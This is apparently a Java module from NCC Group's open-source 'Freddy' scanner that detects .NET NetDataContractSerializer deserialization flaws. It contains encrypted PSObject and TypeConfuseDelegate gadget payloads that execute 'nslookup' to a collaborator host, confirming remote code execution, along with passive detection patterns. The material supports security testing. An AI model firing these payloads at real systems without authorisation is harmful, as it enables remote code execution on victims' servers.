// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET NetDataContractSerializer API.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class NetDataContractSerializerModule extends FreddyModuleBase {
    //PSObject payload data
    private final String PSO_PREFIX = decrypt("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");
    private final String PSO_SUFFIX = decrypt("2cEUwEu4NmK8/rdpLF4j0uZXSl1YbSv2d5mn1UXEKLkC05gX6abJnSMU8pvda+FwP/lRDQkjIdMKECnaNqtQUHt3xHcHjoxbLisljs+uAAVHG4IHU8NgqPbI6jQzLaPz4kgdaP/upDt9JHWvSdmF/K9BZ5y0jVvrg6mANm01Q0IcbFFmbWULtXzY7mk9qwVrQxyhW0Wt3T/oE8ChAVOXyQrkz+tEQKGfRvmpgUw9kcnDqaia+1jvf6OZbQTCefcf7WcZWRm2QoPZbBa2UB02vKc+rv32dcMUyoOFx66vmyf768gktcTl7UVD9Ls6AxtfsD+ePnX7CDO+RYpjzHQiCev54eUtkLNWnKLs8pKMGaVQ/DckEDh1Bf/yiK0QMSEs8SNsO2CbqBI2sFDKA9huHS0P8RKZMbkQ70KaayTRn3PrYV6ixUrppAbGfBXQU2R8v8cUIK4RnXSKsAQMAbPkGqm3H6eZuYkz1+pj/TkxsGKtfLO3RSpH6zDZeVNJjWDVEcHP2C0oej8A/wxWrIduuXYbtQnwiSUIoUdScLpDeYSXZxxjI3zy5ToEUCzNG/KQdSE5fIPrpNz272GAk36072rsqX/bEfKXTHWjkBB+M1YK5M/rREChn0b5qYFMPZHJZZYEue/LnBX1EamzGn22QPCDpBDe5kbC1HHcKPFVD53KH7kmbINleK1Kn3tG6hCHHPQSRFOA57u5YijTmACyMYJWwO+bBdTRsQKfGdBGqBjMO0KnG5NOK7ZTSYXqCfOwxmy4d7SdJjzfHqLcIiBopZDsm56CFxwJfVsYQQaDb2y6MW5Abj/h/hQnYZKCL+rYN8Uy6pSeTQGUfIOYRCyriwLDo5dzXMxyc1UGLh3gmys++awWd4Vars9roqFRbzqxK/IGlLYyDIMJGSWY2T1rbEWc4likr0sotZm/aU483Pa54bG+raLAGUjmOuGfyr3EFVFfLcjhuU2/IXsa4ijNXK6I/BtaA/abSJG1KSl2i7jDwjd9nk5NixdIXIm/JNAinDxYYQnoSOdfNIc3bFjBLrlEAmrg6/UL5LSZgYY5IYXQne+HolM2vdrLBCLnAxEYLtYGyWr3bDLLU3fKT7/UXkStvY4SPt+6UcciDKO/zs12079R0LJSu91RTZcrXuK07wSsfyp8fdXTUV/YJPVuOAJKTUeumdGJpy64HX980DYwwUgh+NE4gJt8xiD4Kl7yCuTP60RAoZ9G+amBTD2RybBMS/duXpGpp09/KffX7gzxTNhASi+p2QaJEKYQ81qlM/RrKAfGpAVNexAPHvb6+zLKfxu9Sny7PwVIPLkfXa+oUKyZLCLfQ5CN/k3UDWE5uUZFuS8/FEat8H9/RkT374chF4dHzllJbQ7FmlSamVrY5I/ZHJtekeHOAqiIVKM8EcHP2C0oej8A/wxWrIduuc2t/+dxszyvH7KuckuyLaAucuDTM9OhI6xGsa21Efh+lep2X4PhWsP9RRckJDnTSKkypZoa2nAUlTBu//PgOSshGIcEDOBHTrk/d3e7Q0/GE5cgLM+03QI+J+4nz0XCqiZ0aPyXq1cGIfrBimNQ/7yZ9COla7hRhCOajmvmcios547GLR7azMQ9Xp+eZ0/12Q==");

    //TypeConfuseDelegate payload data
    private final String TCD_PREFIX = decrypt("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");
    private final String TCD_SUFFIX = decrypt("d9XQatkUpS+3MMP2GbKWrFF3RRBhl9UCryMHr5h4L/6tm016fp5RQIXTJUJzFaNdpVadbCzdob2wRIStZq+UXypkb4BnApuqcnrp3osut+bEZIjpiSF7I6Zj8N1ETdOJuebuzWVtddkw6WctOyFnxK2l4U+/i+XKwLgNmt/zXhZfuZLyuyqEOV8fZ/iDpi8E");

    protected void initialiseModule() {
        setName("NetDataContractSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("type((=)|(%3d))((\")|(%22))", Pattern.CASE_INSENSITIVE), Pattern.compile("assembly((=)|(%3d))((\")|(%22))", Pattern.CASE_INSENSITIVE)}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("NetDataContractSerializer.InternalReadObject", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<test/>", "NetDataContractSerializer.InternalReadObject");

        registerActiveScanCollaboratorPayload(PN_PSOBJ, false);
        registerActiveScanCollaboratorPayload(PN_TYPCONDEL, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_PSOBJ:
                return PSO_PREFIX + "nslookup " + hostname + PSO_SUFFIX;

            case PN_TYPCONDEL:
                return TCD_PREFIX + "nslookup " + hostname + TCD_SUFFIX;
        }
        return null;
    }
}
